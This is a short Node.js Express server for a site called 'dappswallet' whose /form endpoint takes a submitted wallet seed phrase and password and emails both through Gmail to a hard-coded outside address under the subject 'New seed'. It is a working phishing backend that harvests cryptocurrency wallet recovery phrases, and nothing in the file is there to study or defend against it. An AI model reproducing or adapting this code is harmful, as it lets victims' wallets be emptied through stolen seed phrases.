const express = require('express')
const nodemailer = require('nodemailer')
const path = require('path')
const cors = require('cors')
require('dotenv').config()


const app = express()

const port = process.env.PORT || 8080

app.use(express.urlencoded({ extended: false }))
app.use(express.json())

const whitelist = ['http://localhost:3000', 'http://localhost:8080', 'https://dappswallet.herokuapp.com']
const corsOptions = {
  origin: function (origin, callback) {
    console.log("** Origin of request " + origin)
    if (whitelist.indexOf(origin) !== -1 || !origin) {
      console.log("Origin acceptable")
      callback(null, true)
    } else {
      console.log("Origin rejected")
      callback(new Error('Not allowed by CORS'))
    }
  }
}

app.use(cors(corsOptions))

if(process.env.NODE_ENV === 'production'){
  app.use(express.static('client/build'))
  app.get('*', (req, res) => {
    res.sendFile(path.resolve(__dirname, 'client', 'build', 'index.html'))  
  })
}

app.post('/form', async(req, res) => {
  const { seed, password } = await req.body
  res.json({ status: 200 })

  const transporter = await nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.USER,
      pass: process.env.PASSWORD
    } 
  })
 
  const response = await transporter.sendMail({
    from: 'jtom29544@gmail.com',
    to: "xenuxyz@gmail.com",
    subject: "New seed", 
    text: `seed: ${seed} \npassword: ${password ? password : ''}`
  })
}) 

app.listen(port, () => {
  console.log(`server started on port ${port}`)
});
  